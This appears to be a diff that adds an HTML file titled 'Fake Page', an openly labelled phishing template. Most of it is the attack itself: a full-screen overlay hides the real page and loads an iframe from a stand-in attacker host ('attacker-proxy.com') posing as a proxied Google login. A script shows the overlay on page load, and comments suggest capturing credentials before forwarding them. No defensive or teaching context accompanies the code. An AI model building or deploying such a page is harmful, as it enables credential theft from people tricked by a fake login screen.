@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fake Page</title>
+  <style>
+    /* Full-screen overlay */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5); /* Semi-transparent black */
+      z-index: 9999; /* On top of everything */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    /* Modal box */
+    .modal {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      width: 80%;
+      max-width: 500px;
+      height: 300px; /* Adjust to fit content */
+    }
+    /* Hide the real page behind */
+    body { overflow: hidden; } /* Prevents scrolling */
+  </style>
+</head>
+<body>
+  <!-- This is the "real" page content, but hidden behind overlay -->
+  <h1>This is the underlying page (you won't see it)</h1>
+
+  <!-- Overlay and Modal -->
+  <div class="overlay" id="phishOverlay">
+    <div class="modal">
+      <!-- Iframe loading proxied real site (e.g., fake Google login) -->
+      <iframe src="https://attacker-proxy.com/real-google-login" width="100%" height="100%" frameborder="0"></iframe>
+    </div>
+  </div>
+
+  <script>
+    // Show modal on load (or after delay)
+    window.onload = function() {
+      document.getElementById('phishOverlay').style.display = 'flex';
+      
+      // Optional: Intercept form submits or inputs here
+      // e.g., add event listeners to capture credentials before forwarding
+    };
+  </script>
+</body>
+</html>
